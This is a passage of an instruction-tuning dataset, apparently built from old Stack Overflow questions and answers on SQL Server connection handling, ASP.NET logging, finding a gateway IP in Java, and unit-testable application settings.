{"instruction": "I want to rename a database, but keep getting the error that 'couldn't get exclusive lock' on the database, which implies there is some connection(s) still active.\nHow can I kill all the connections to the database so that I can rename it?", "output": "See Kill All Active Connections To A Database.\nThe reason that the approach that Adam suggested won't work is that during the time that you are looping over the active connections new one can be established, and you'll miss those. The article I linked to uses the following approach which does not have this drawback:\n-- set your current connection to use master otherwise you might get an error\n\nuse master\nALTER DATABASE YourDatabase SET SINGLE_USER WITH ROLLBACK IMMEDIATE \n\n--do you stuff here \n\nALTER DATABASE YourDatabase SET MULTI_USER"}
{"instruction": "I want to rename a database, but keep getting the error that 'couldn't get exclusive lock' on the database, which implies there is some connection(s) still active.\nHow can I kill all the connections to the database so that I can rename it?", "output": "Script to accomplish this, replace 'DB_NAME' with the database to kill all connections to:\nUSE master\nGO\n\nSET NOCOUNT ON\nDECLARE @DBName varchar(50)\nDECLARE @spidstr varchar(8000)\nDECLARE @ConnKilled smallint\nSET @ConnKilled=0\nSET @spidstr = ''\n\nSet @DBName = 'DB_NAME'\nIF db_id(@DBName) < 4\nBEGIN\nPRINT 'Connections to system databases cannot be killed'\nRETURN\nEND\nSELECT @spidstr=coalesce(@spidstr,',' )+'kill '+convert(varchar, spid)+ '; '\nFROM master..sysprocesses WHERE dbid=db_id(@DBName)\n\nIF LEN(@spidstr) > 0\nBEGIN\nEXEC(@spidstr)\nSELECT @ConnKilled = COUNT(1)\nFROM master..sysprocesses WHERE dbid=db_id(@DBName)\nEND"}
{"instruction": "I want to rename a database, but keep getting the error that 'couldn't get exclusive lock' on the database, which implies there is some connection(s) still active.\nHow can I kill all the connections to the database so that I can rename it?", "output": "Using SQL Management Studio Express:\nIn the Object Explorer tree drill down under Management to \"Activity Monitor\" (if you cannot find it there then right click on the database server and select \"Activity Monitor\"). Opening the Activity Monitor, you can view all process info. You should be able to find the locks for the database you're interested in and kill those locks, which will also kill the connection.\nYou should be able to rename after that."}
{"instruction": "I want to rename a database, but keep getting the error that 'couldn't get exclusive lock' on the database, which implies there is some connection(s) still active.\nHow can I kill all the connections to the database so that I can rename it?", "output": "Try this:\nALTER DATABASE [DATABASE_NAME]\nSET SINGLE_USER\nWITH ROLLBACK IMMEDIATE"}
{"instruction": "I want to rename a database, but keep getting the error that 'couldn't get exclusive lock' on the database, which implies there is some connection(s) still active.\nHow can I kill all the connections to the database so that I can rename it?", "output": "I've always used:\n\nALTER DATABASE DB_NAME SET SINGLE_USER WITH ROLLBACK IMMEDIATE \nGO \nSP_RENAMEDB 'DB_NAME','DB_NAME_NEW'\nGo \nALTER DATABASE DB_NAME_NEW  SET MULTI_USER -- set back to multi user \nGO"}
{"instruction": "My license for Whole Tomatoes Visual AssistX is about to expire and I'm not really planning on renewing it.  I use it for spell checking but that's about it.  The refactoring abilities have been a little disappointing.  Before I just jump into Resharper though what are your thoughts on other possible plugins?", "output": "Once you get into resharper, you really don't want to leave, its done a massive amount to improve my productivity.\nIt depends though on what you are doing. Are you doing a lot of TDD when you write tests, write code, then refactor?\nUnless you are pretty intensely into refactoring then I'd suggest that you might not get the best of out R#.\nAs a plugin for a plugin I use the RGreatX plugin for R#. It's really handy for shifting string values out to resource files for localization of the software.....saves me plenty of time!"}
{"instruction": "Let's say I'm creating a chess program. I have a function\nvoid foreachMove( void (*action)(chess_move*), chess_game* game);\n\nwhich will call the function pointer action on each valid move. This is all well and good, but what if I need to pass more parameters to the action function? For example:\nchess_move getNextMove(chess_game* game, int depth){\n  //for each valid move, determine how good the move is\n  foreachMove(moveHandler, game);\n}\n\nvoid moveHandler(chess_move* move){\n  //uh oh, now I need the variables \"game\" and \"depth\" from the above function\n}\n\nRedefining the function pointer is not the optimal solution. The foreachMove function is versatile and many different places in the code reference it. It doesn't make sense for each one of those references to have to update their function to include parameters that they don't need.\nHow can I pass extra parameters to a function that I'm calling through a pointer?", "output": "If your parameters change, I would change the function pointer declaration to use the \"...\" technique to set up a variable number of arguments.  It could save you in readability and also having to make a change for each parameter you want to pass to the function.  It is definately a lot safer than passing void around.\nhttp://publications.gbdirect.co.uk/c_book/chapter9/stdarg.html\nJust an FYI, about the example code in the link: some places they have \u201cn args\u201d and others it is \u201cn_args\u201d with the underscore. They should all have the underscore. I thought the syntax looked a little funny until  I realized they had dropped the underscore in some places."}
{"instruction": "Does anybody recommend a design pattern for taking a binary data file, parsing parts of it into objects and storing the resultant data into a database?  \nI think a similar pattern could be used for taking an XML or tab-delimited file and parse it into their representative objects.\nA common data structure would include:\n\n(Header) (DataElement1) (DataElement1SubData1) (DataElement1SubData2)(DataElement2) (DataElement2SubData1) (DataElement2SubData2) (EOF)\n\nI think a good design would include a way to change out the parsing definition based on the file type or some defined metadata included in the header.  So a Factory Pattern would be part of the overall design for the Parser part.", "output": "The Strategy pattern is maybe one you want to look at. The strategy being the file parsing algorithm.\nThen you want a separate strategy for database insertion."}
{"instruction": "I've got some Japanese in the ALT attribute, but the tooltip is showing me the ugly block characters in the tooltip.  The rest of the content on the page renders correctly.  So far, it seems to be limited to the tooltips.", "output": "I'm not sure about the unicode issue but if you want the tooltip effect you should be using the title attribute, not alt.\nAlt is for text you want screenreaders to speak, and it's what gets displayed if an image can't be loaded."}
{"instruction": "I've got some Japanese in the ALT attribute, but the tooltip is showing me the ugly block characters in the tooltip.  The rest of the content on the page renders correctly.  So far, it seems to be limited to the tooltips.", "output": "This is because the font used in the tooltip doesn't include the characters you are trying to display. Try installing a font pack that includes those characters. I'm affraid you can't do much for your site's visitors other than implementating a tooltip yourself using javascript."}
{"instruction": "Does anybody recommend a design pattern for taking a binary data file, parsing parts of it into objects and storing the resultant data into a database?  \nI think a similar pattern could be used for taking an XML or tab-delimited file and parse it into their representative objects.\nA common data structure would include:\n\n(Header) (DataElement1) (DataElement1SubData1) (DataElement1SubData2)(DataElement2) (DataElement2SubData1) (DataElement2SubData2) (EOF)\n\nI think a good design would include a way to change out the parsing definition based on the file type or some defined metadata included in the header.  So a Factory Pattern would be part of the overall design for the Parser part.", "output": "Just write your file parser, using whatever techniques come to mind\nWrite lots of unit tests for it to make sure all your edge cases are covered\n\nOnce you've done this, you will actually have a reasonable idea of the problem/solution.\nRight now you just have theories floating around in your head, most of which will turn out to be misguided.\nStep 3: Refactor mercilessly. Your aim should be to delete about half of your code\nYou'll find that your code at the end will either resemble an existing design pattern, or you'll have created a new one. You'll then be qualified to answer this question :-)"}
{"instruction": "I've got some Japanese in the ALT attribute, but the tooltip is showing me the ugly block characters in the tooltip.  The rest of the content on the page renders correctly.  So far, it seems to be limited to the tooltips.", "output": "Can you sanitize the alt text so that it doesn't have the characters in it, preferably by replacing the entire text with something useful (rather than just filtering the string)?  That's not ideal, but neither is displaying broken characters, or telling your users to install a new font pack."}
{"instruction": "What I would like to do is create a clean virtual machine image as the output of a build of an application.\nSo a new virtual machine would be created (from a template is fine, with the OS installed, and some base software installed) --- a new web site would be created in IIS, and the web app build output copied to a location on the virtual machine hard disk, and IIS configured correctly, the VM would start up and run.\nI know there are MSBuild tasks to script all the administrative actions in IIS, but how do you script all the actions with Virtual machines?  Specifically, creating a new virtual machine from a template, naming it uniquely, starting it, configuring it, etc...\nSpecifically I was wondering if anyone has successfully implemented any VM scripting as part of a build process.\nUpdate: I assume with Hyper-V, there is a different set of libraries/APIs to script virtual machines, anyone played around with this?  And anyone with real practical experience of doing something like this?", "output": "You can actually script a fair number of tasks in MS Virtual Server:\nhttp://www.microsoft.com/technet/scriptcenter/scripts/vs/default.mspx?mfr=true\nhttp://msdn.microsoft.com/en-us/library/aa368876(VS.85).aspx\nAlso Virtual PC guy has got a ton of stuff on his blog about scripting Virtual Server/PC and now Hyper-V here:\nhttp://blogs.msdn.com/virtual_pc_guy/default.aspx\nVMware has similar capabilities:\nhttp://www.vmware.com/support/developer/scripting-API/"}
{"instruction": "I've got some Japanese in the ALT attribute, but the tooltip is showing me the ugly block characters in the tooltip.  The rest of the content on the page renders correctly.  So far, it seems to be limited to the tooltips.", "output": "Where's your Japanese input coming from? It could be that it's in a non-unicode (e.g. http://en.wikipedia.org/wiki/JIS_X_0208) encoding, whereas your file is in unicode so the browser attempts to interpret the non-unicode characters as unicode and gets confused. I tried throwing together an example to reproduce your problem:\n<img src=\"test.png\" alt=\"\u65e5\u672c\u8a9e\" />\n\nThe tooltip displays properly under IE7 with the Japanese language pack installed."}
{"instruction": "In a web application like wiki or forums or blogging software, it is often useful to store your data in a relational database. Since many hosting companies offer a single database with their hosting plans (with additional databases costing extra) it is very useful for your users when your database objects (tables, views, constraints, and stored procedures) have a common prefix. It is typical for applications aware of database scarcity to have a hard-coded table prefix. I want more, however. Specifically, I'd like to have a table prefix that users can designate\u2014say in the web.config file (with an appropriate default, of course).\nSince I hate coding CRUD operations by hand, I prefer to work through a competent OR/M and have used (and enjoyed) LINQ to SQL, Subsonic, and ADO.Net. I'm having some thrash in a new project, however, when it comes to putting a table prefix in a user's web.config file. Are there any .Net-based OR/M products that can handle this scenario elegantly?\nThe best I have been able to come up with so far is using LINQ to SQL with an external mapping file that I'd have to update somehow based on an as-yet hypothetical web.config setting.\nAnyone have a better solution? I tried to make it happen in Entity Framework, but that turned into a mess quickly. (Due to my unfamiliarity with EF? Possibly.) How about SubSonic? Does it have an option to apply a table prefix besides at code generation time?", "output": "LightSpeed allows you to specify an INamingStrategy that lets you resolve table names dynamically at runtime."}
{"instruction": "This question and answer shows how to send a file as a byte array through an XML web service. How much overhead is generated by using this method for file transfer?  I assume the data looks something like this:\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<bytes>\n    <byte>16</byte>\n    <byte>28</byte>\n    <byte>127</byte>\n    ...\n</bytes>\n\nIf this format is correct, the bytes must first be converted to UTF-8 characters. Each of these characters allocates 8 bytes. Are the bytes stored in base 10, hex, or binary characters? How much larger does the file appear as it is being sent due to the XML data and character encoding? Is compression built into web services?", "output": "I use this method for some internal corporate webservices, and I haven't noticed any major slow-downs (but that doesn't mean it's not there).  \nYou could probably use any of the numerous network traffic analysis tools to measure the size of the data, and make a judgment call based off that."}
{"instruction": "This question and answer shows how to send a file as a byte array through an XML web service. How much overhead is generated by using this method for file transfer?  I assume the data looks something like this:\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<bytes>\n    <byte>16</byte>\n    <byte>28</byte>\n    <byte>127</byte>\n    ...\n</bytes>\n\nIf this format is correct, the bytes must first be converted to UTF-8 characters. Each of these characters allocates 8 bytes. Are the bytes stored in base 10, hex, or binary characters? How much larger does the file appear as it is being sent due to the XML data and character encoding? Is compression built into web services?", "output": "Typically a byte array is sent as a base64 encoded string, not as individual bytes in tags. \nhttp://en.wikipedia.org/wiki/Base64\nThe base64 encoded version is about 137% of the size of the original content."}
{"instruction": "This question and answer shows how to send a file as a byte array through an XML web service. How much overhead is generated by using this method for file transfer?  I assume the data looks something like this:\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<bytes>\n    <byte>16</byte>\n    <byte>28</byte>\n    <byte>127</byte>\n    ...\n</bytes>\n\nIf this format is correct, the bytes must first be converted to UTF-8 characters. Each of these characters allocates 8 bytes. Are the bytes stored in base 10, hex, or binary characters? How much larger does the file appear as it is being sent due to the XML data and character encoding? Is compression built into web services?", "output": "I'm not sure about all the details (compressing, encoding, etc) but I usually just use WireShark to analyze the network traffic (while trying various methods) which then allows you to see exactly how it's sent.\nFor example, if it's compressed the data block of the packet shouldn't be readable as plain text...however if it's uncompressed, you will just see plain old xml text...like you would see with HTTP traffic, or even FTP in certain cases."}
{"instruction": "This question and answer shows how to send a file as a byte array through an XML web service. How much overhead is generated by using this method for file transfer?  I assume the data looks something like this:\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<bytes>\n    <byte>16</byte>\n    <byte>28</byte>\n    <byte>127</byte>\n    ...\n</bytes>\n\nIf this format is correct, the bytes must first be converted to UTF-8 characters. Each of these characters allocates 8 bytes. Are the bytes stored in base 10, hex, or binary characters? How much larger does the file appear as it is being sent due to the XML data and character encoding? Is compression built into web services?", "output": "To echo what Kevin said, in .net web services if you have a byte array it is sent as a base64 encoded string by default. You can also specify the encoding of the byte array beforehand. \nObviously, once it gets to the server (or client) you need to manually decode the string back into a byte array as this isn't done automagically for you unfortunately."}
{"instruction": "I have an Ajax.Net enabled ASP.Net 2.0 web site. Hosting for both the site and the database are out of my control as is the database's schema. In testing on hardware I do control the site performs well however on the client's hardware, there are noticeable delays when reloading or changing pages. \nWhat I would like to do is make my application as compact and speedy as possible when I deliver it. One idea is to set expiration dates for all of the site's static resources so they aren't recalled on page loads. By resources I mean images, linked style sheets and JavaScript source files. Is there an easy way to do this?\nWhat other ways are there to optimize a .Net web site?\nUPDATE: \nI've run YSlow on the site and the areas where I am getting hit the hardest are in the number of JavaScript and Style Sheets being loaded (23 JS files and 5 style sheets). All but one (the main style sheet) has been inserted by Ajax.net and Asp. Why so many?", "output": "I wrote a blog post about improving ASP.NET page performance this a couple months back. Here are some quick & easy ways -\n\nTurn off view state\nTurn off event validation\nImplement HTTP gzip/deflate compression to reduce the response size (number of bytes the server has to send back to the client)\nTry to optimize/minimize your database calls for each request"}
{"instruction": "How can I determine the IP of my router/gateway in Java? I can get my IP easily enough. I can get my internet IP using a service on a website. But how can I determine my gateway's IP?\nThis is somewhat easy in .NET if you know your way around. But how do you do it in Java?", "output": "That is not as easy as it sounds.  Java is platform independent, so I am not sure how to do it in Java.  I am guessing that .NET contacts some web site which reports it back.  There are a couple ways to go.  First, a deeper look into the ICMP protocol may give you the information you need.  You can also trace the IP you go through (your route).  When you encounter an IP that is not in the following ranges:\n\n10.0.0.0 \u2013 10.255.255.255\n172.16.0.0 \u2013 172.31.255.255\n192.168.0.0 \u2013 192.168.255.255\n\nit is the IP one hop away from yours, and probably shares a few octets of information with your IP.\nBest of luck.  I'll be curious to hear a definitive answer to this question."}
{"instruction": "How can I determine the IP of my router/gateway in Java? I can get my IP easily enough. I can get my internet IP using a service on a website. But how can I determine my gateway's IP?\nThis is somewhat easy in .NET if you know your way around. But how do you do it in Java?", "output": "Try shelling out to traceroute if you have it.\n'traceroute -m 1 www.amazon.com' will emit something like this:\ntraceroute to www.amazon.com (72.21.203.1), 1 hops max, 40 byte packets\n 1  10.0.1.1 (10.0.1.1)  0.694 ms  0.445 ms  0.398 ms\n\nParse the second line.  Yes, it's ugly, but it'll get you going until someone posts something nicer."}
{"instruction": "I'm looking for the best way to log errors in an ASP.NET application.\nI want to be able to receive emails when errors occurs in my application, with detailed information about the Exception and the current Request.\nIn my company we used to have our own ErrorMailer, catching everything in the Global.asax Application_Error. It was \"Ok\" but not very flexible nor configurable.\nWe swithed recently to NLog. It's much more configurable, we can define different targets for the errors, filter them, buffer them (not tried yet). It's a very good improvement.\nBut I discovered lately that there's a whole Namespace in the .Net framework for this purpose : System.Web.Management and it can be configured in the healthMonitoring section of web.config.\nHave you ever worked with .Net health monitoring? What is your solution for error logging?\nThanks,\nVincent", "output": "We use a custom home grown logging util we wrote.  It requires you to implement logging on your own everywhere you need it.  But, it also allows your to capture alot more then just the exception.\nFor example our code would look like this:\n<pre><code>\nTry\n  Dim p as New Person()\n  p.Name = \"Joe\"\n  p.Age = 30\nCatch ex as Exception\n  Log.LogException(ex,\"Err creating person and assigning name/age\")\n  Throw ex\nEnd Try\n</code></pre>\n\nThis way our logger will write all the info we need to a sql db.  We have email alerts set up at the db level to look for certain errors or frequently occurring errrors.  It helps us identify exactly where the errors are coming from.\nThis might not be exactly what you're looking for.  Another approach similar to using Global.asax is to us a code injection technique like AOP with PostSharp.  This allows you to inject custom code at the beginning and end of every method or on every exception.  It' an interesting approach but I believe it may have a heavy performance overhead."}
{"instruction": "I'm looking for the best way to log errors in an ASP.NET application.\nI want to be able to receive emails when errors occurs in my application, with detailed information about the Exception and the current Request.\nIn my company we used to have our own ErrorMailer, catching everything in the Global.asax Application_Error. It was \"Ok\" but not very flexible nor configurable.\nWe swithed recently to NLog. It's much more configurable, we can define different targets for the errors, filter them, buffer them (not tried yet). It's a very good improvement.\nBut I discovered lately that there's a whole Namespace in the .Net framework for this purpose : System.Web.Management and it can be configured in the healthMonitoring section of web.config.\nHave you ever worked with .Net health monitoring? What is your solution for error logging?\nThanks,\nVincent", "output": "My team uses log4net from Apache.  It's pretty lightweight and easy to setup.  Best of all, it's completely configurable from the web.config file, so once you've got the hooks in your code setup, you can completely change the way logging is done just by changing the web.config file.  \nlog4net supports logging to a wide variety of locations - database, email, text file, Windows event log, etc.  My team has it configured to send detailed error information to a database, and also send an email to the entire team with enough information for us to determine in which part of the code the error originated.  Then we know who is responsible for that piece of code, and they can go to the database to get more detailed information."}
{"instruction": "I'm looking for the best way to log errors in an ASP.NET application.\nI want to be able to receive emails when errors occurs in my application, with detailed information about the Exception and the current Request.\nIn my company we used to have our own ErrorMailer, catching everything in the Global.asax Application_Error. It was \"Ok\" but not very flexible nor configurable.\nWe swithed recently to NLog. It's much more configurable, we can define different targets for the errors, filter them, buffer them (not tried yet). It's a very good improvement.\nBut I discovered lately that there's a whole Namespace in the .Net framework for this purpose : System.Web.Management and it can be configured in the healthMonitoring section of web.config.\nHave you ever worked with .Net health monitoring? What is your solution for error logging?\nThanks,\nVincent", "output": "I use elmah.  It has some really nice features and here is a CodeProject article on it.  I think the StackOverflow team uses elmah also!"}
{"instruction": "I'm looking for the best way to log errors in an ASP.NET application.\nI want to be able to receive emails when errors occurs in my application, with detailed information about the Exception and the current Request.\nIn my company we used to have our own ErrorMailer, catching everything in the Global.asax Application_Error. It was \"Ok\" but not very flexible nor configurable.\nWe swithed recently to NLog. It's much more configurable, we can define different targets for the errors, filter them, buffer them (not tried yet). It's a very good improvement.\nBut I discovered lately that there's a whole Namespace in the .Net framework for this purpose : System.Web.Management and it can be configured in the healthMonitoring section of web.config.\nHave you ever worked with .Net health monitoring? What is your solution for error logging?\nThanks,\nVincent", "output": "I've been using the Enterprise Library's Logging objects. It allows you to have different types of logging (flat file, e-mail, and/or database). It's pretty customizable and has a pretty good interface for updating your web.config for the configuration of the logging. Usually I call my logging from the On Error in the Global.asax.\nHere's a link to the MSDN"}
{"instruction": "How can I determine the IP of my router/gateway in Java? I can get my IP easily enough. I can get my internet IP using a service on a website. But how can I determine my gateway's IP?\nThis is somewhat easy in .NET if you know your way around. But how do you do it in Java?", "output": "You may be better off using something like checkmyip.org, which will determine your public IP address - not necessarily your first hop router: at Uni I have a \"real\" IP address, whereas at home it is my local router's public IP address.\nYou can parse the page that returns, or find another site that allows you to just get the IP address back as the only string.\n(I'm meaning load this URL in Java/whatever, and then get the info you need).\nThis should be totally platform independent."}
{"instruction": "I'm looking for the best way to log errors in an ASP.NET application.\nI want to be able to receive emails when errors occurs in my application, with detailed information about the Exception and the current Request.\nIn my company we used to have our own ErrorMailer, catching everything in the Global.asax Application_Error. It was \"Ok\" but not very flexible nor configurable.\nWe swithed recently to NLog. It's much more configurable, we can define different targets for the errors, filter them, buffer them (not tried yet). It's a very good improvement.\nBut I discovered lately that there's a whole Namespace in the .Net framework for this purpose : System.Web.Management and it can be configured in the healthMonitoring section of web.config.\nHave you ever worked with .Net health monitoring? What is your solution for error logging?\nThanks,\nVincent", "output": "I've been using Log4net, configured to email details of fatal errors.  It's also set up to log everything to a log file, which is invaluable when trying to debug problems.  The other benefit is that if that standard functionality doesn't do what you want it to, it's fairly easy to write a custom appender which can process the logging information as required.\nHaving said that, I'm using this in tandem with a custom error handler which sends out a html email with a bit more information than is included in the standard log4net emails - page, session variables, cookies, http server variables, etc.\nThese are both wired up in the Application_OnError event, where the exception is logged as a fatal exception in log4net (which then causes it to be emailed to a specified email address), and also handled using the custom error handler.\nFirst heard about Elmah from the Coding Horror blog entry, Crash Responsibly, and although it looks promising I'm yet to implement it any projects."}
{"instruction": "How can I determine the IP of my router/gateway in Java? I can get my IP easily enough. I can get my internet IP using a service on a website. But how can I determine my gateway's IP?\nThis is somewhat easy in .NET if you know your way around. But how do you do it in Java?", "output": "Matthew: Yes, that is what I meant by \"I can get my internet IP using a service on a website.\" Sorry about being glib.\nBrian/Nick: Traceroute would be fine except for the fact that lots of these routers have ICMP disabled and thus it always stalls.\nI think a combination of traceroute and uPnP will work out. That is what I was planning on doing, I as just hoping I was missing something obvious.\nThank you everyone for your comments, so it sounds like I'm not missing anything obvious. I have begun implementing some bits of uPnP in order to discover the gateway."}
{"instruction": "How can I determine the IP of my router/gateway in Java? I can get my IP easily enough. I can get my internet IP using a service on a website. But how can I determine my gateway's IP?\nThis is somewhat easy in .NET if you know your way around. But how do you do it in Java?", "output": "Java doesn't make this as pleasant as other languages, unfortunately. Here's what I did:\nimport java.io.*;\nimport java.util.*;\n\npublic class ExecTest {\n    public static void main(String[] args) throws IOException {\n        Process result = Runtime.getRuntime().exec(\"traceroute -m 1 www.amazon.com\");\n\n        BufferedReader output = new BufferedReader(new InputStreamReader(result.getInputStream()));\n        String thisLine = output.readLine();\n        StringTokenizer st = new StringTokenizer(thisLine);\n        st.nextToken();\n        String gateway = st.nextToken();\n        System.out.printf(\"The gateway is %s\\n\", gateway);\n    }\n}\n\nThis presumes that the gateway is the second token and not the third. If it is, you need to add an extra st.nextToken(); to advance the tokenizer one more spot."}
{"instruction": "In a web application like wiki or forums or blogging software, it is often useful to store your data in a relational database. Since many hosting companies offer a single database with their hosting plans (with additional databases costing extra) it is very useful for your users when your database objects (tables, views, constraints, and stored procedures) have a common prefix. It is typical for applications aware of database scarcity to have a hard-coded table prefix. I want more, however. Specifically, I'd like to have a table prefix that users can designate\u2014say in the web.config file (with an appropriate default, of course).\nSince I hate coding CRUD operations by hand, I prefer to work through a competent OR/M and have used (and enjoyed) LINQ to SQL, Subsonic, and ADO.Net. I'm having some thrash in a new project, however, when it comes to putting a table prefix in a user's web.config file. Are there any .Net-based OR/M products that can handle this scenario elegantly?\nThe best I have been able to come up with so far is using LINQ to SQL with an external mapping file that I'd have to update somehow based on an as-yet hypothetical web.config setting.\nAnyone have a better solution? I tried to make it happen in Entity Framework, but that turned into a mess quickly. (Due to my unfamiliarity with EF? Possibly.) How about SubSonic? Does it have an option to apply a table prefix besides at code generation time?", "output": "Rather than use table prefixes instead have an application user that belongs to a schema (in MS Sql 2005 or above).\nThis means that instead of:\nselect * from dbo.clientAProduct\nselect * from dbo.clientBroduct\n\nYou have:\nselect * from clientA.Product\nselect * from clientB.Product"}
{"instruction": "I have been looking into IKVMing Apache's FOP project to use with our .NET app.  It's a commercial product, and looking into licensing, IKVM runs into some sticky areas because of its use of GNU Classpath.  From what I've seen, no one can say for sure if this stuff can be used in a commercial product.  Has anyone used IKVM, or an IKVM'd product, in a commercial product?  Here's what I've found so far:\nIKVM license page, which notes that one dll contains code from other projects, their license GPLv2 + Classpath Exception\nSaxon for .NET is generated with IKVM, but released under the Apache license...\nAnyone have experience with this?", "output": "I'm not a lawyer but all licenses mentioned are okay to be used in commercial products as long as you don't make any changes and claim the code is yours. \nI think if you don't wanna risk anything you should consult a lawyer."}
{"instruction": "I'm doing a authorization check from a WinForms application with the help of the AzMan authorization provider from Enterprise Library and am receiving the the following error:\n\nUnable to update the password. The value provided as the current password is incorrect. (Exception from HRESULT: 0x8007052B) (Microsoft.Practices.EnterpriseLibrary.Security.AzMan) \n\nUnable to update the password. The value provided as the current password is incorrect. (Exception from HRESULT: 0x8007052B) (Microsoft.Interop.Security.AzRoles) \n\nThe AzMan store is hosted in ADAM on another computer in the same domain. Other computers and users do not have this problem. The user making the call has read access to both ADAM and the AzMan store. The computer running the WinForms app and the computer running ADAM are both on Windows XP SP2.\nI've had access problems with AzMan before that I've resolved, but this is a new one... What am I missing?", "output": "I found out from the event log that there was a security issue with the user making the call to AzMan from a remote computer. The user did not belong the local Users group on the computer running ADAM/AzMan. When I corrected that everything worked again."}
{"instruction": "A database application that I'm currently working on, stores all sorts of settings in the database. Most of those settings are there to customize certain business rules, but there's also some other stuff in there.\nThe app contains objects that specifically do a certain task, e.g., a certain complicated calculation. Those non-UI objects are unit-tested, but also need access to lots of those global settings. The way we've implemented this right now, is by giving the objects properties that are filled by the Application Controller at runtime. When testing, we create the objects in the test and fill in values for testing (not from the database).\nThis works better, in any case much better than having all those objects need some global Settings object --- that of course effectively makes unit testing impossible :) Disadvantage can be that you sometimes need to set a dozen of properties, or that you need to let those properties 'percolate' into sub-objects.\nSo the general question is: how do you provide access to global application settings in your projects, without the need for global variables, while still being able to unit test your code? This must be a problem that's been solved 100's of times...\n(Note: I'm not too much of an experienced programmer, as you'll have noticed; but I love to learn! And of course, I've already done research into this topic, but I'm really looking for some first-hand experiences)", "output": "Usually this is handled by an ini file or XML configuration file. Then you just have a class that reads the setting when neeed.\n.NET has this built in with the ConfigurationManager classes, but it's quite easy to implement, just read text files, or load XML into DOM or parse them by hand in code.\nHaving config files in the database is ok, but it does tie you to the database, and creates an extra dependancy for your app that ini/xml files solve."}
{"instruction": "A database application that I'm currently working on, stores all sorts of settings in the database. Most of those settings are there to customize certain business rules, but there's also some other stuff in there.\nThe app contains objects that specifically do a certain task, e.g., a certain complicated calculation. Those non-UI objects are unit-tested, but also need access to lots of those global settings. The way we've implemented this right now, is by giving the objects properties that are filled by the Application Controller at runtime. When testing, we create the objects in the test and fill in values for testing (not from the database).\nThis works better, in any case much better than having all those objects need some global Settings object --- that of course effectively makes unit testing impossible :) Disadvantage can be that you sometimes need to set a dozen of properties, or that you need to let those properties 'percolate' into sub-objects.\nSo the general question is: how do you provide access to global application settings in your projects, without the need for global variables, while still being able to unit test your code? This must be a problem that's been solved 100's of times...\n(Note: I'm not too much of an experienced programmer, as you'll have noticed; but I love to learn! And of course, I've already done research into this topic, but I'm really looking for some first-hand experiences)", "output": "I did this:\npublic class MySettings\n{\n    public static double Setting1\n        { get { return SettingsCache.Instance.GetDouble(\"Setting1\"); } }\n\n    public static string Setting2\n        { get { return SettingsCache.Instance.GetString(\"Setting2\"); } }\n}\n\nI put this in a separate infrastructure module to remove any issues with circular dependencies.\nDoing this I am not tied to any specific configuration method, and have no strings running havoc in my applications code."}
{"instruction": "A database application that I'm currently working on, stores all sorts of settings in the database. Most of those settings are there to customize certain business rules, but there's also some other stuff in there.\nThe app contains objects that specifically do a certain task, e.g., a certain complicated calculation. Those non-UI objects are unit-tested, but also need access to lots of those global settings. The way we've implemented this right now, is by giving the objects properties that are filled by the Application Controller at runtime. When testing, we create the objects in the test and fill in values for testing (not from the database).\nThis works better, in any case much better than having all those objects need some global Settings object --- that of course effectively makes unit testing impossible :) Disadvantage can be that you sometimes need to set a dozen of properties, or that you need to let those properties 'percolate' into sub-objects.\nSo the general question is: how do you provide access to global application settings in your projects, without the need for global variables, while still being able to unit test your code? This must be a problem that's been solved 100's of times...\n(Note: I'm not too much of an experienced programmer, as you'll have noticed; but I love to learn! And of course, I've already done research into this topic, but I'm really looking for some first-hand experiences)", "output": "You could use Martin Fowlers ServiceLocator pattern. In php it could look like this:\nclass ServiceLocator {\n  private static $soleInstance;\n  private $globalSettings;\n\n  public static function load($locator) {\n    self::$soleInstance = $locator;\n  }\n\n  public static function globalSettings() {\n    if (!isset(self::$soleInstance->globalSettings)) {\n      self::$soleInstance->setGlobalSettings(new GlobalSettings());\n    }\n    return self::$soleInstance->globalSettings;\n  }\n}\n\nYour production code then initializes the service locator like this:\nServiceLocator::load(new ServiceLocator());\n\nIn your test-code, you insert your mock-settings like this:\nServiceLocator s = new ServiceLocator();\ns->setGlobalSettings(new MockGlobalSettings());\nServiceLocator::load(s);\n\nIt's a repository for singletons that can be exchanged for testing purposes."}
{"instruction": "A database application that I'm currently working on, stores all sorts of settings in the database. Most of those settings are there to customize certain business rules, but there's also some other stuff in there.\nThe app contains objects that specifically do a certain task, e.g., a certain complicated calculation. Those non-UI objects are unit-tested, but also need access to lots of those global settings. The way we've implemented this right now, is by giving the objects properties that are filled by the Application Controller at runtime. When testing, we create the objects in the test and fill in values for testing (not from the database).\nThis works better, in any case much better than having all those objects need some global Settings object --- that of course effectively makes unit testing impossible :) Disadvantage can be that you sometimes need to set a dozen of properties, or that you need to let those properties 'percolate' into sub-objects.\nSo the general question is: how do you provide access to global application settings in your projects, without the need for global variables, while still being able to unit test your code? This must be a problem that's been solved 100's of times...\n(Note: I'm not too much of an experienced programmer, as you'll have noticed; but I love to learn! And of course, I've already done research into this topic, but I'm really looking for some first-hand experiences)", "output": "I like to model my configuration access off of the Service Locator pattern.  This gives me a single point to get any configuration value that I need and by putting it outside the application in a separate library, it allows reuse and testability.  Here is some sample code, I am not sure what language you are using, but I wrote it in C#.\nFirst I create a generic class that will models my ConfigurationItem.\npublic class ConfigurationItem<T>\n{\n    private T item;\n\n    public ConfigurationItem(T item)\n    {\n        this.item = item;\n    }\n\n    public T GetValue()\n    {\n        return item;\n    }\n}\n\nThen I create a class that exposes public static readonly variables for the configuration item.  Here I am just reading the ConnectionStringSettings from a config file, which is just xml.  Of course for more items, you can read the values from any source.\npublic class ConfigurationItems\n{\n    public static ConfigurationItem<ConnectionStringSettings> ConnectionSettings = new ConfigurationItem<ConnectionStringSettings>(RetrieveConnectionString());\n\n    private static ConnectionStringSettings RetrieveConnectionString()\n    {\n        // In .Net, we store our connection string in the application/web config file.\n        // We can access those values through the ConfigurationManager class.\n        return ConfigurationManager.ConnectionStrings[ConfigurationManager.AppSettings[\"ConnectionKey\"]];\n    }\n}\n\nThen when I need a ConfigurationItem for use, I call it like this:\nConfigurationItems.ConnectionSettings.GetValue();\n\nAnd it will return me a type safe value, which I can then cache or do whatever I want with.\nHere's a sample test:\n[TestFixture]\npublic class ConfigurationItemsTest\n{\n    [Test]\n    public void ShouldBeAbleToAccessConnectionStringSettings()\n    {\n        ConnectionStringSettings item = ConfigurationItems.ConnectionSettings.GetValue();\n        